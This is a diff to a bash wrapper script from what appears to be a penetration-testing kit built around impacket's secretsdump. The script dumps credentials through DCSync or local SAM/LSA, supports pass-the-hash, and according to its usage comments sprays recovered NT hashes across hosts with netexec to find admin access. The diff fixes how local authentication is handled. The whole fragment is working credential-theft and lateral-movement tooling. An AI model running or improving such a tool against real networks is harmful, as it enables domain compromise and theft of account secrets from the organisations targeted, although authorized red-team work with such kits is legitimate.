@@ -12,7 +12,8 @@ KIT="$(cd "$(dirname "$(readlink -f "${BASH_SOURCE[0]}")")/.." && pwd)"
 #   -t  target to dump (DC for DCSync, or any host for local SAM/LSA)
 #   -d  domain (omit or use '.' for a LOCAL account / workgroup host)
 #   -u  username        -p  password        -H  NT hash (pass-the-hash)
-#   -l  local auth (-local-auth: authenticate against the box's SAM, not the domain)
+#   -l  local auth: authenticate against the box's SAM, not the domain
+#       (drops the domain prefix from the target so secretsdump auths locally)
 #   -n  workspace name under targets/ (default: <target>)
 #   -S  hosts file — after dumping, spray every recovered NT hash across these
 #       hosts with netexec (finds where else the creds work). Admin => (Pwn3d!)
@@ -45,7 +46,9 @@ PRE="$USER"; [ -n "$DOMAIN" ] && [ "$LOCAL" = 0 ] && PRE="$DOMAIN/$USER"
 IMPARGS=()
 if [ -n "$HASH" ]; then IMPARGS+=(-hashes ":$HASH"); TGT="${PRE}@${TARGET}"
 else TGT="${PRE}:${PASS}@${TARGET}"; fi
-[ "$LOCAL" = 1 ] && IMPARGS+=(-local-auth)
+# Local auth is implicit in secretsdump: omitting the domain from the target
+# string (handled above via PRE) authenticates against the box's SAM. There is
+# no -local-auth flag (that's a netexec/crackmapexec option).
 
 echo "=================================================="
 echo " SECRETSDUMP   target=$TARGET  as=${DOMAIN:+$DOMAIN/}$USER  local=$LOCAL"
